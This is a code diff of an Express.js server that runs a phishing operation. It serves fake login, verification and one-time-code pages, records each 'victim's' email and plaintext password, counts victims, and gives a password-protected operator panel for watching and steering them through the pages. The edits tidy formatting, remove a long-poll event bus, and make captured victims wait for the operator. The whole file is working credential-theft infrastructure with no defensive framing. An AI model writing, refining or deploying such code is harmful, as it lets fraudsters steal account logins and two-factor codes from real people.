@@ -1,34 +1,21 @@
 /* ----------  DEPENDENCIES  ---------- */
 const express = require('express');
-const cors    = require('cors');
-const crypto  = require('crypto');
+const cors = require('cors');
+const crypto = require('crypto');
 
 /* ----------  CONFIG  ---------- */
-const PANEL_USER     = process.env.PANEL_USER  || 'admin';
-const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
+const PANEL_USER = process.env.PANEL_USER || 'admin';
+const PANEL_PASS = process.env.PANEL_PASS || 'changeme';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
-const COOKIE_NAME    = 'pan_sess_v2';
+const COOKIE_NAME = 'pan_sess_v2';
 
-const app  = express();
+const app = express();
 const PORT = process.env.PORT || 3000;
 
-console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***' });
-
-/* ----------  SIMPLE EVENT BUS  ---------- */
-const events = new (require('events')).EventEmitter();
-function emitPanelUpdate() { events.emit('panel'); }
+console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***', PORT });
 
 /* ----------  TRUST PROXY ---------- */
 app.set('trust proxy', 1);
-
-/* ----------  PROTOCOL MIDDLEWARE ---------- */
-app.use((req, res, next) => {
-  if (req.headers['x-forwarded-proto'] === 'https') {
-    req.protocol = 'https';
-    req.secure = true;
-  }
-  next();
-});
 
 /* ----------  CACHE CONTROL MIDDLEWARE ---------- */
 app.use((req, res, next) => {
@@ -64,7 +51,7 @@ function setSessionCookie(res, data) {
   const encoded = Buffer.from(JSON.stringify(data)).toString('base64url');
   const signature = signCookie(encoded, SESSION_SECRET);
   const value = `${encoded}.${signature}`;
-  
+
   res.cookie(COOKIE_NAME, value, {
     httpOnly: true,
     secure: true,
@@ -78,17 +65,17 @@ function setSessionCookie(res, data) {
 function getSessionCookie(req) {
   const cookie = req.cookies?.[COOKIE_NAME];
   if (!cookie) return null;
-  
+
   try {
     const [encoded, signature] = cookie.split('.');
     if (!encoded || !signature) return null;
-    
+
     const expectedSig = signCookie(encoded, SESSION_SECRET);
     if (signature !== expectedSig) {
       console.log('[DEBUG] Cookie signature mismatch');
       return null;
     }
-    
+
     return JSON.parse(Buffer.from(encoded, 'base64url').toString());
   } catch (e) {
     console.log('[DEBUG] Cookie parse error:', e.message);
@@ -97,10 +84,10 @@ function getSessionCookie(req) {
 }
 
 function clearSessionCookie(res) {
-  res.clearCookie(COOKIE_NAME, { 
-    path: '/', 
-    httpOnly: true, 
-    secure: true, 
+  res.clearCookie(COOKIE_NAME, {
+    path: '/',
+    httpOnly: true,
+    secure: true,
     sameSite: 'lax'
   });
 }
@@ -108,41 +95,41 @@ function clearSessionCookie(res) {
 // Session middleware
 app.use((req, res, next) => {
   req.session = getSessionCookie(req) || {};
-  
+
   if (req.session.authed) {
     req.session.lastActivity = Date.now();
   }
-  
+
   console.log(`[DEBUG] Host: ${req.headers.host}, URL: ${req.url}, Authed: ${req.session?.authed}`);
-  
+
   req.session.save = () => setSessionCookie(res, req.session);
   req.session.destroy = () => {
     clearSessionCookie(res);
     req.session = {};
   };
-  
+
   next();
 });
 
+/* ----------  MIDDLEWARE ---------- */
 app.use(cors());
 app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-/* ----------  STATE  ---------- */
-const sessionsMap     = new Map();
-const sessionActivity = new Map();
-const auditLog        = [];
-let victimCounter     = 0;
-let successfulLogins  = 0;
-let currentDomain     = '';
-
-/* ----------  STATIC ROUTES  ---------- */
+app.use(express.urlencoded({ extended: true })); // Parse form data
 app.use(express.static(__dirname));
 
-app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
-app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
+/* ----------  STATE  ---------- */
+const sessionsMap = new Map();
+const sessionActivity = new Map();
+const auditLog = [];
+let victimCounter = 0;
+let successfulLogins = 0;
+let currentDomain = '';
+
+/* ----------  STATIC ROUTES  ---------- */
+app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
+app.get('/verify.html', (req, res) => res.sendFile(__dirname + '/verify.html'));
 app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
-app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
+app.get('/otp.html', (req, res) => res.sendFile(__dirname + '/otp.html'));
 app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
 
 /* ----------  PANEL ACCESS CONTROL  ---------- */
@@ -172,6 +159,7 @@ app.post('/panel/login', (req, res) => {
   res.redirect(303, '/panel?fail=1');
 });
 
+// Catch-all for /panel/* sub-paths
 app.get(/^\/panel\/(.*)$/, (req, res) => res.redirect(302, '/panel'));
 
 app.post('/panel/logout', (req, res) => {
@@ -183,7 +171,7 @@ app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
 
 /* ----------  DOMAIN HELPER  ---------- */
 app.use((req, res, next) => {
-  const host  = req.headers.host || req.hostname;
+  const host = req.headers.host || req.hostname;
   const proto = req.headers['x-forwarded-proto'] || req.protocol;
   currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
   next();
@@ -231,8 +219,8 @@ function cleanupSession(sid, reason, silent = false) {
 app.post('/api/session', async (req, res) => {
   try {
     const sid = crypto.randomUUID();
-    const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-    const ua  = req.headers['user-agent'] || 'n/a';
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+    const ua = req.headers['user-agent'] || 'n/a';
     const now = new Date();
     const dateStr = now.toLocaleString();
 
@@ -271,15 +259,9 @@ app.post('/api/login', async (req, res) => {
     const { sid, email, password } = req.body;
     if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
-
     const v = sessionsMap.get(sid);
-    v.entered = true;
-    v.email = email;
-    v.password = password;
-    v.status = 'ok'; // <-- Set status to 'ok' to allow the victim to proceed
-    v.page = 'verify.html'; // <-- Update the page to 'verify.html'
-    v.attempt += 1;
-    v.totalAttempts += 1;
+    v.entered = true; v.email = email; v.password = password;
+    v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
@@ -431,29 +413,14 @@ function buildPanelPayload() {
   };
 }
 
-// FIXED: Proper long-poll with response tracking
+// Long-poll for panel updates
 app.get('/api/panel', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
   req.session.lastActivity = Date.now();
   req.session.save();
 
-  let responded = false;
-  
-  const listener = () => {
-    if (responded) return;
-    responded = true;
-    res.json(buildPanelPayload());
-  };
-  
-  events.once('panel', listener);
-  
-  setTimeout(() => {
-    if (responded) return;
-    responded = true;
-    events.removeListener('panel', listener);
-    res.json(buildPanelPayload());
-  }, 1000);
+  res.json(buildPanelPayload());
 });
 
 app.post('/api/panel', async (req, res) => {
@@ -485,7 +452,6 @@ app.post('/api/panel', async (req, res) => {
       break;
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
-      emitPanelUpdate();
       break;
   }
   res.json({ ok: true });
@@ -494,14 +460,14 @@ app.post('/api/panel', async (req, res) => {
 /* ----------  SESSION REFRESH (NEW)  ---------- */
 app.post('/api/refresh', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
-  
+
   // Clear all victim sessions and data
   sessionsMap.clear();
   sessionActivity.clear();
   auditLog.length = 0;
   victimCounter = 0;
   successfulLogins = 0;
-  
+
   console.log('[DEBUG] Session refreshed by admin');
   res.json({ ok: true });
 });
@@ -542,7 +508,3 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
-
-
-
-
